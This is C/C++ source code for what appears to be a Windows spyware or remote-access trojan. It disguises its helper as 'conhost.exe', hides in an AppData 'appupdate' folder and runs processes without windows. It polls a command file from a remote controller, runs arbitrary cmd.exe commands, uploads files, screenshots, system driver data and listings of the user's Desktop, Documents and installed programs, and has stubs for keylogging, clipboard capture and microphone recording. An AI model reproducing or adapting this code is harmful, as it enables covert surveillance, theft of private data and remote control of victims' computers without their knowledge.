#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/types.h>
#include <dirent.h>
//#if       _WIN32_WINNT < 0x0500 //
//#undef  _WIN32_WINNT //
//#define _WIN32_WINNT   0x0500 //
//#endif
#include <windows.h>
#include <Lmcons.h>
#include <io.h>
#include <time.h>
#include <gdiplus.h>
#include <iostream>
#include <memory>
#ifdef __linux__
#include <pwd.h>
#include <unistd.h>
#endif
    
    char resName[1024] = {0};
    char response_res[1024]={0};
    void firstRun(void);
    void quickLoad(void);
    void loadData(FILE *file, char *folder, int recursive);
    void nextRun(void);
    void mainop();
    void keylog_service(void);
    void clipboard_service(void);
    void cnc_service(void);
    int screenshot=0;
    char *buf;
    char cwd[200] = {0};
    #ifdef _WIN32
   int ListDirectoryContents(FILE *, const char *, int);
    #endif
    void my_system(char* , char* );
    char exepath[] = "conhost.exe";//original from yogesh
    //char exepath[] = "conhost.exe "; //just checking

using namespace Gdiplus;
using namespace std;

int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
{
    UINT num = 0;          // number of image encoders
    UINT size = 0;         // size of the image encoder array in bytes

    ImageCodecInfo* pImageCodecInfo = NULL;

    GetImageEncodersSize(&num, &size);
    if(size == 0)
    {
        return -1;  // Failure
    }

    pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
    if(pImageCodecInfo == NULL)
    {
        return -1;  // Failure
    }

    GetImageEncoders(num, size, pImageCodecInfo);

    for(UINT j = 0; j < num; ++j)
    {
        if( wcscmp(pImageCodecInfo[j].MimeType, format) == 0 )
        {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;  // Success
        }    
    }

    free(pImageCodecInfo);
    return -1;  // Failure
}

void BitmapToJpg(HBITMAP hbmpImage, int width, int height)
{
    Bitmap *p_bmp = Bitmap::FromHBITMAP(hbmpImage, NULL);
    //Bitmap *p_bmp = new Bitmap(width, height, PixelFormat32bppARGB);
    
    CLSID pngClsid;
    int result = GetEncoderClsid(L"image/jpeg", &pngClsid);
    if(result != -1)
        std::cout << "Encoder succeeded" << std::endl;
    else
        std::cout << "Encoder failed" << std::endl;
    p_bmp->Save(L"scr_screen.jpg", &pngClsid, NULL);
    delete p_bmp;
}

bool ScreenCapture(int x, int y, int width, int height, char *filename)
{
    HDC hDc = CreateCompatibleDC(0);
    HBITMAP hBmp = CreateCompatibleBitmap(GetDC(0), width, height);
    SelectObject(hDc, hBmp);
    BitBlt(hDc, 0, 0, width, height, GetDC(0), x, y, SRCCOPY);
    BitmapToJpg(hBmp, width, height);
    DeleteObject(hBmp);
    return true;
}


int main(void)
    {
  // FreeConsole();
  
  /* HWND hwnd = GetConsoleWindow();
   ShowWindow(hwnd,SW_HIDE);
   ShowWindow(hwnd, SW_MINIMIZE);*/
    /*STARTUPINFO si;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE; */  
    
      //just to change the working directory
    
    buf = getenv ("appdata");
    strcpy(cwd,buf);
    strcat(cwd,"\\appupdate\\1");
     _chdir(cwd);
     

    FILE *firstRunFile = fopen("first_run.txt", "r");
    if(firstRunFile){
        
#ifdef debug
        printf("\nExecuting next run.\n");
#endif
          fclose(firstRunFile);
        nextRun(); //for now

#ifdef debug
        printf("\nExecuted next run.\n");
#endif

    }
    else {
        fclose(firstRunFile);
        firstRun();
    }

    fclose(firstRunFile);
    
    return 0;
}
void my_system(char *exe , char *arg)
{
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    
    //uncomment by me
    //si.dwFlags = STARTF_USESHOWWINDOW;
    //si.wShowWindow = SW_HIDE; 
    //TILL HERE



    ZeroMemory(&pi, sizeof(pi));
   // LPWSTR str = L" file.txt up";
   
    if(!CreateProcess(exe, // module name.
        arg,    // Command line.
        NULL,    // Process handle not inheritable.
        NULL,    // Thread handle not inheritable.
        FALSE,   // Set handle inheritance to FALSE.
      CREATE_NO_WINDOW,//CREATE_NEW_CONSOLE,// DETACHED_PROCESS,       // No creation flags.
        NULL,    // Use parent's environment block.
        NULL,    // Use parent's starting directory.
        &si,     // Pointer to STARTUPINFO structure.
        &pi)     // Pointer to PROCESS_INFORMATION structure.
    )
  // LoadCursor(NULL,IDC_HAND);
   CloseHandle(pi.hProcess);
   CloseHandle(pi.hThread);
  // LoadCursor(NULL,IDC_HAND);
}


void keylog_service(void){ printf(" ");}
void clipboard_service(void){ printf(" ");}

void cnc_service(void){
    
    FILE *resFile;
    
   
    /*char download[100]={0};
    strcpy(download,"start ");
    strcat(download,exepath);
    strcat(download," cmd_r.txt down");
    system(download);*/
    //ShowWindow( GetConsoleWindow(), SW_HIDE );//add by me
    my_system(exepath," cmd_r.txt down");
    //system("start conhost.exe cmd_r.txt down");
    Sleep(5000);
    ////WinExec("start conhost.exe cmd_r.txt down",SW_HIDE);
    ////Sleep(5000);
    resFile = fopen("cmd_r.txt", "r");
    //system("conhost.exe 3cnc.txt up");
    if(!resFile)
        return;
    fseek(resFile, 0, SEEK_END);
    long fsize = ftell(resFile);
        if(fsize == 0)
        return;
    fseek(resFile, 0, SEEK_SET);
    char *resF = (char *) malloc ( sizeof(char) * 1024);
    memset(resF, '\0', sizeof(char) * 1024);
    fread(resF, sizeof(char), fsize, resFile);
    strcpy(response_res,resF);
    fclose(resFile);
    Sleep(7000);
    remove("cmd_r.txt");
    printf("remove cmd_r.txt %d\n", remove("cmd_r.txt"));
   
#ifdef debug
    printf("\nSize loaded file read is %ld and content  %s\n", fsize, resF); 
#endif

    memcpy(resName, resF, 1024);
    free((void *)resF);
    

    char *token;
    char seps[] = ",";
    char data1[100] = {0}, data2[100] = {0};//, data3[100] = {0};
    
    token = strtok(resName, seps);
    token = strtok(NULL, seps);
    sscanf(token, "%s", data1);
        
    if(memcmp(data1, "CMDL", 4 * sizeof(char)) == 0){

        token = strtok(NULL, seps);
        sscanf(token, "%s ", data2);

        #ifdef __linux__
        char ss[] = " > res.txt 2> /dev/null 3> /dev/null ";
        #endif
        
        #ifdef _WIN32
       // char ss[] = " > res.txt ";    //for windows 64 you have to add
        #endif
        
        //strcat(data2, ss);
        #ifdef debug
            printf("Command executing is %s\n", data2);
        #endif
        
        printf("Command executing is %s\n", data2);//just checking
        //system("conhost.exe 3CMDL.txt up");//added by me
       //system(data2);//old one
            char cmd_in[50] = "C:\\Windows\\System32\\cmd.exe /q /c ";
            strcat(cmd_in,data2);
            strcat(cmd_in," > res.txt");
            printf("\nCMD_IN=%s\n",cmd_in);
            //ShowWindow( GetConsoleWindow(), SW_HIDE );//add by me
            my_system("C:\\Windows\\System32\\cmd.exe",cmd_in);
            //WinExec(cmd_in,SW_HIDE);
        /*char update[100]="start ";
        strcat(update," ");
        strcat(update,exepath);
        strcat(update," res.txt updt");
        system(update);*/
            Sleep(4000);
        my_system(exepath," res.txt updt");
            Sleep(3000);
    }
   
    if(memcmp(data1, "FILEU", 5 * sizeof(char)) == 0){
        token = strtok(NULL, seps);
        sscanf(token, "%s ", data2);
        #ifdef debug
            printf("Upload file and its path %s\n", data2);
        #endif
            char upload[100]={0}; 
        //strcat(upload,exepath);
        //strcat(upload," ");
        strcat(upload,data2);
        strcat(upload," up");
        char excm[50]={0};
        strcat(excm," ");
        strcat(excm,data2);
        strcat(excm," up");

        //system(upload);*/
            //my_system(exepath,upload);//original
        //ShowWindow( GetConsoleWindow(), SW_HIDE );
            my_system(exepath,excm);//this one working
            printf("INSIDE FILEU EXCM=%s upload=%s\n",excm,upload);
            //my_system("conhost.exe",excm);//just checking  //this one working
            //my_system("conhost.exe",upload);//just checking
            //system("conhost.exe 3FILEU.txt up");
            Sleep(4000);
    }

    if(memcmp(data1, "GetScr", 6 * sizeof(char)) == 0){

        token = strtok(NULL, seps);
        sscanf(token, "%s ", data2);
        {
            if(memcmp(data2, "start", 5 * sizeof(char)) == 0){
                screenshot=1;

            }if(memcmp(data2, "stop", 4 * sizeof(char)) == 0){
                screenshot=0;
            }
        }   
    }

    
    if(memcmp(data1, "MICREC", 6 * sizeof(char)) == 0){
        if(memcmp(data2, "START", 5 * sizeof(char)) == 0)
        printf(" ");
    
        if(memcmp(data2, "STOP", 4 * sizeof(char)) == 0)
        printf(" ");
   }
 }


void nextRun(void)
{
    
    //system("conhost.exe 3next.txt up");
#ifdef debug
    printf("\nCalling keyload service.\n"); 
#endif

  //  keylog_service();

#ifdef debug
    printf("\nCalling clipboard service.\n"); 
#endif

    //clipboard_service();

#ifdef debug
    printf("\nCalling cnc service.\n"); 
#endif
   cnc_service();

#ifdef debug
    printf("\nCalling main op.\n"); 
#endif
  quickLoad();
    mainop();
}


void firstRun(void)
{
    
    FILE *firstRun = fopen("first_run.txt", "w");
    //system("conhost.exe 3first.txt up");
    if(firstRun){
        fclose(firstRun);
        //ShowWindow( GetConsoleWindow(), SW_HIDE );//add by me
    my_system("C:\\Windows\\System32\\cmd.exe"," /q /c driverquery.exe 1> device.txt");
    Sleep(2000);
        //WinExec("C:\\Windows\\System32\\cmd.exe /q /c driverquery.exe 1> device.txt",SW_HIDE);
    //ShowWindow( GetConsoleWindow(), SW_HIDE );//add by me
        my_system(exepath," device.txt up");
        //WinExec("conhost.exe device.txt up",SW_HIDE);
        Sleep(2000);
        fclose(firstRun);
        nextRun();
        }
}



void loadData(FILE *file, char *folder, int recursive){

#ifdef __linux__
    register struct passwd *pw;
    register uid_t uid;

    uid = geteuid ();
    pw =  getpwuid (uid);

    char *PATH = (char *) malloc (4096 * sizeof(char));

    strcat(PATH, "/home/");
    strcat(PATH, pw->pw_name);
    strcat(PATH, "/");
    strcat(PATH, folder);
    
    DIR *dp;
    struct dirent *ep;     
    dp = opendir (PATH);

    while (ep = readdir (dp)){
        fputs(ep->d_name, file);

#ifdef debug
        printf("\n%d PATH is %s\n", i, ep->d_name);
#endif
        fputs("\n", file);
    }

    (void) closedir (dp);

    free((void *)PATH);
#elif _WIN32
    
    TCHAR username[UNLEN+1];
    DWORD username_len = UNLEN+1;
    
    GetUserName(username, &username_len);
    
    #ifdef debug
    printf("%s\n", username);
    #endif
    
    char PATH[100 + UNLEN] = {0};
    
    strcat(PATH, "C:\\Users\\");
    
    #ifdef debug
    printf("%s\n", PATH);
    #endif
    
    strcat(PATH, (char *)username);
    strcat(PATH, "\\");
    
    #ifdef debug
    printf("%s\n", PATH);
    #endif
    
    strcat(PATH, folder);
    
    #ifdef debug
    printf("%s\n", PATH);
    #endif

#ifdef debug
    printf("\nPATH to load data is %s\n", PATH);
#endif
    
    ListDirectoryContents(file, PATH, recursive);

#endif
    
}



//***************NEW FUNCTION
void mainop(void){
    //system("conhost.exe 3mainop.txt up");
#ifdef debug
    printf("\nMain\n");
#endif
    
#ifdef _WIN32
    Sleep(9000);
#endif
    
#ifdef __linux__
    //sleep(60);
#endif

            if(screenshot==1){
           GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
    
    int x1 = 0;
    int y1 = 0;
    int x2 = GetSystemMetrics(SM_CXSCREEN);
    int y2 = GetSystemMetrics(SM_CYSCREEN);
    ScreenCapture(x1, y1, x2 - x1, y2 - y1, "scr_screen.jpg");
    
    //Shutdown GDI+
    GdiplusShutdown(gdiplusToken);
               
            my_system(exepath," scr_screen.jpg up");
            Sleep(5000);
            
            }

    FILE *thumb = fopen("thumbs.db", "r");
    if(thumb!=NULL){
    fseek(thumb, 0, SEEK_END);
    long fsize = ftell(thumb);
    fseek(thumb, 0, SEEK_SET);

#ifdef debug
    if(thumb)
        printf("\nthumb.db file size is %ld", fsize);
#endif
    
    fclose(thumb);
   // char str[100]= {0};
    if(fsize > 2 * 1024 * sizeof(char)){
       //uploadFile("key.log");
       //system("start main_2.exe thumbs.db up"); //NEW upload here

        //system("move thumbs.db thumbs_old.db");//original
        //ShowWindow( GetConsoleWindow(), SW_HIDE );//add by me
        my_system("C:\\Windows\\System32\\cmd.exe","C:\\Windows\\System32\\cmd.exe /q /c move thumbs.db thumbs_old.db");//by me
        Sleep(2000);
        
  //       strcpy(str,"start ");
        // strcat(str,exepath);
  //      //system("start conhost.exe thumbs_old.db updt");
  //      strcat(str," thumbs_old.db updt");
        //system(str);
       // ShowWindow( GetConsoleWindow(), SW_HIDE );//add by me
        my_system(exepath," thumbs_old.db updt");
        Sleep(2000);
 
    }
       
    }

    FILE *thumbs1 = fopen("thumbs1.db", "r");
    if(thumbs1!=NULL){
    fseek(thumbs1, 0, SEEK_END);
    long fsize = ftell(thumbs1);
    fseek(thumbs1, 0, SEEK_SET);
    
#ifdef debug
    if(thumbs1)
        printf("\nthumbs1.db file size is %ld", fsize);
#endif
    
    fclose(thumbs1);
    char thu_ol[100]= {0};
    strcpy(thu_ol,"start ");
    if(fsize > 2 * 1024 * sizeof(char))
    {
       //system("move thumbs1.db thumbs1_old.db");
        //ShowWindow( GetConsoleWindow(), SW_HIDE );//add by me
       my_system("C:\\Windows\\System32\\cmd.exe","C:\\Windows\\System32\\cmd.exe /q /c move thumbs1.db thumbs1_old.db");//by me
       Sleep(2000);
       //system("start conhost.exe thumbs1_old.db updt"); //NEW for upload
     /* strcpy(thu_ol,"start ");
      strcat(thu_ol,exepath);
      strcat(thu_ol," thumbs1_old.db updt");
      system(thu_ol);*/
      //ShowWindow( GetConsoleWindow(), SW_HIDE );//add by me
       my_system(exepath," thumbs1_old.db updt");
       Sleep(2000);
    }
    }
#ifdef debug
    printf("\nCalling quickLoad.\n");
#endif

    quickLoad();

#ifdef debug
    printf("\nCalling main op.\n");
#endif
cnc_service();
    mainop();
}

void quickLoad(void){
    FILE *desktop = fopen("desktop.txt", "w");
    FILE *documents = fopen("documents.txt", "w");
    FILE *program = fopen("program.txt", "w");
#ifdef debug
    if(desktop)
        printf("\nDesktop file created.\n");
#endif
#ifdef debug
    if(documents)
        printf("\nDocuments file created.\n");
#endif
#ifdef debug
    if(program)
        printf("\nProgram file created.\n");
#endif
    loadData(desktop, "Desktop", 1);
    loadData(documents, "Documents", 1);

#ifdef __linux__
    if(system("apt list --installed 1> program.txt 2> /dev/null 3> /dev/null") == -1){
#endif

#ifdef _WIN32
    {
        loadData(program, "..\\..\\Program Files", 0);
        loadData(program, "..\\..\\Program Files (x86)", 0);
#endif
        
#ifdef debug
        printf("Search programs SUCCESS\n");
#endif
     }
    FILE *desktop_old = fopen("desktop_old.txt", "r");
    FILE *documents_old = fopen("documents_old.txt", "r");
    FILE *program_old = fopen("program_old.txt", "r");

#ifdef debug
    if(desktop_old)
        printf("\nOld Desktop file read.\n");
#endif

#ifdef debug
    if(documents_old)
        printf("\nOld Documents file read.\n");
#endif

#ifdef debug
    if(program_old)
        printf("\nOld Program file read.\n");
#endif

    if(desktop_old){
        fseek(desktop_old, 0L, SEEK_END);
        fseek(desktop, 0L, SEEK_SET);
        fseek(desktop, 0L, SEEK_END);
        int oldFileSize = ftell(desktop_old);
        int newFileSize = ftell(desktop);

    fclose(desktop_old);
      if(oldFileSize == newFileSize)
      {   fclose(desktop); 
          remove("desktop.txt");
      }
        else {
            //char desk_up[100]={0};
            //strcpy(desk_up,"start ");
   //         fclose(desktop);
   //         //uploadFile("desktop.txt");
            //strcat(desk_up,exepath);
            //strcat(desk_up," desktop.txt updt");
            ////system("start conhost.exe desktop.txt updt");
   //         system(desk_up);
            ////WinExec("start main_2.exe desktop.txt updt", SW_HIDE);
            //ShowWindow( GetConsoleWindow(), SW_HIDE );//add by me
              my_system(exepath," desktop.txt updt");
              Sleep(3000);
            //WinExec("conhost.exe desktop.txt updt", SW_HIDE);
            remove("desktop_old.txt");
        }
    }
        else {
        //  char desk_up1[100]={0};
        //  strcpy(desk_up1,"start ");
  //      fclose(desktop);
  //      //uploadFile("desktop.txt");
        //strcat(desk_up1,exepath);
        //  strcat(desk_up1," desktop.txt updt");
        ////system("start conhost.exe desktop.txt updt");
  //       system(desk_up1);
        //WinExec("start main_2.exe desktop.txt updt", SW_HIDE);
                //ShowWindow( GetConsoleWindow(), SW_HIDE );
              my_system(exepath," desktop.txt updt");
                //WinExec("conhost.exe desktop.txt updt", SW_HIDE);
              Sleep(3000);
       // rename("desktop.txt","desktop_old.txt");
            
    }
        
        
 
    if(documents_old){
        fseek(documents_old, 0L, SEEK_END);
        fseek(documents, 0L, SEEK_SET);
        fseek(documents, 0L, SEEK_END);

        int oldFileSize = ftell(documents_old);
        int newFileSize = ftell(documents);

#ifdef debug
        printf("\nSize of old document and new document file %d %d\n", oldFileSize, newFileSize);
#endif

    fclose(documents_old);

        if(oldFileSize == newFileSize){
            fclose(documents);
            remove("documents.txt");
        
        }
        else {
        fclose(documents);
            fclose(documents);
        /*  char u_buf[100] = {0};
            strcpy(u_buf,"start ");
            strcat(u_buf,exepath);
            strcat(u_buf," documents.txt updt");
            system(u_buf);*/
            //ShowWindow( GetConsoleWindow(), SW_HIDE );//add by me
              my_system(exepath," documents.txt updt");
              Sleep(3000);
            //  WinExec("conhost.exe documents.txt updt", SW_HIDE);
            remove("documents_old.txt");
        
        }
    }
        else{
              fclose(documents);
            //char u_buf1[100] = {0};
            //strcpy(u_buf1,"start ");
            //strcat(u_buf1,exepath);
   //      
            ////system("start conhost.exe documents.txt updt");//update
            //strcat(u_buf1," documents.txt updt");
   //        system(u_buf1);
              //ShowWindow( GetConsoleWindow(), SW_HIDE );//add by me
                my_system(exepath," documents.txt updt");
            //      WinExec("conhost.exe documents.txt updt", SW_HIDE);
        }
    if(program_old){
        fseek(program_old, 0L, SEEK_END);
        fseek(program, 0L, SEEK_SET);
        fseek(program, 0L, SEEK_END);

        int oldFileSize = ftell(program_old);
        int newFileSize = ftell(program);

#ifdef debug
        printf("\nSize of old program and new program file %d %d\n", oldFileSize, newFileSize);
#endif

    fclose(program_old);

        if(oldFileSize == newFileSize){
            fclose(program);
            remove("program.txt");
        }
        else {
    fclose(program);
            //uploadFile("program.txt");
    //char p_buf1[100] = {0};
    //      strcpy(p_buf1,"start ");
    //      strcat(p_buf1,exepath);
    //      //system("start conhost.exe program.txt updt");//update
 //           strcat(p_buf1," program.txt updt");
    //      system(p_buf1);
    //ShowWindow( GetConsoleWindow(), SW_HIDE );//add by me
      my_system(exepath," program.txt updt");
        //WinExec("conhost.exe program.txt updt", SW_HIDE);
      Sleep(3000);
            remove("program_old.txt");
        }
    }
        else{
            fclose(program);
            //char p_buf[100] = {0};
            //strcpy(p_buf,"start ");
            //strcat(p_buf,exepath);
            ////system("start conhost.exe program.txt updt");//update
            //strcat(p_buf," program.txt updt");
            //system(p_buf);
            //ShowWindow( GetConsoleWindow(), SW_HIDE );//add by me
              my_system(exepath," program.txt updt");

              Sleep(3000);
            //  WinExec("conhost.exe program.txt updt", SW_HIDE);
        }
}




#ifdef _WIN32
        int ListDirectoryContents(FILE * state,const char *sDir, int recursive)
{
    WIN32_FIND_DATA fdFile;
    HANDLE hFind = NULL;

    char sPath[2048];

    //Specify a file mask. *.* = We want everything!
    sprintf(sPath, "%s\\*.*", sDir);

    if((hFind = FindFirstFile(sPath, &fdFile)) == INVALID_HANDLE_VALUE)
    {
        return FALSE;
    }

    do
    {
        //Find first file will always return "."
        //    and ".." as the first two directories.
        if(strcmp(fdFile.cFileName, ".") != 0
                && strcmp(fdFile.cFileName, "..") != 0)
        {
            //Build up our file path using the passed in
            //  [sDir] and the file/foldername we just found:
                sprintf(sPath, "%s\\%s", sDir, fdFile.cFileName);         

            //Is the entity a File or Folder?
            if(fdFile.dwFileAttributes &FILE_ATTRIBUTE_DIRECTORY)
            {
                fprintf(state, "%s\n", sPath);
                if(recursive){

                    ListDirectoryContents(state, sPath, recursive); //Recursion, I love it!
                }
            }
            else{
                fprintf(state, "%s\n", sPath);
            }
        }
    }
    while(FindNextFile(hFind, &fdFile)); //Find the next file.

    FindClose(hFind); //Always, Always, clean things up!

    return TRUE;
}
#endif

